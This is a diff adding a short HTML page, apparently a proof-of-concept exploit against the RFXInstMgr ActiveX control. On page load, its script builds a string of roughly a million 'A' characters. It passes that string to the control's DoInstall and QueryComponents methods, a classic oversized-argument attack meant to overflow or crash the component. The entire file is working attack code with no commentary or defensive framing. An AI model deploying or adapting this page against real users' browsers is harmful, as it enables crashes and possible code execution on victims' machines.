@@ -1,0 +1,22 @@
+<html>
+ <head>
+  <script language="JavaScript" DEFER>
+    function Check() {
+    var s = "AAAA";
+
+    while (s.length < 999999) s=s+s;
+
+     var obj = new ActiveXObject("RFXInstMgr.RFXInstMgr"); //{47F59200-8783-11D2-8343-00A0C945A819}
+
+
+     obj.DoInstall(s);
+     obj.QueryComponents(s);
+
+   }
+  </script>
+
+ </head>
+ <body onload="JavaScript: return Check();">
+
+ </body>
+</html>
